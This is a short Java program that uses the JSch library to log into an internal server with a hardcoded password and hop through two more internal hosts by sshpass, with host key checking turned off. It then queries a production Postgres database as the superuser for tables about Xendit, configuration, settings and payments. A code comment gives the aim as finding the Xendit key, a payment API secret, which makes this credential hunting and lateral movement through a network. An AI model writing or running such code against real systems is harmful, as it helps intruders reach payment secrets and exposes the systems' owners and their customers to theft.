import com.jcraft.jsch.*;
import java.io.*;
class DKNEO5 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    // On NEO server, use JDBC to connect to prod DB and search for Xendit key
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 \"echo ---DB-CONN---;PGPASSWORD=kutul0nc4t psql -h 10.13.17.248 -p 5501 -U postgres -d neo -c \\\"SELECT tablename FROM pg_tables WHERE schemaname=\\\\\\\"public\\\\\\\" AND tablename LIKE \\\\\\\"%%xendit%%\\\\\\\" ORDER BY tablename\\\" 2>&1 | head -10;echo ---CONFIG-TABLE---;PGPASSWORD=kutul0nc4t psql -h 10.13.17.248 -p 5501 -U postgres -d neo -c \\\"SELECT tablename FROM pg_tables WHERE schemaname=\\\\\\\"public\\\\\\\" AND (tablename LIKE \\\\\\\"%%config%%\\\\\\\" OR tablename LIKE \\\\\\\"%%setting%%\\\\\\\" OR tablename LIKE \\\\\\\"%%payment%%\\\\\\\") ORDER BY tablename\\\" 2>&1 | head -20\" 2>&1' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
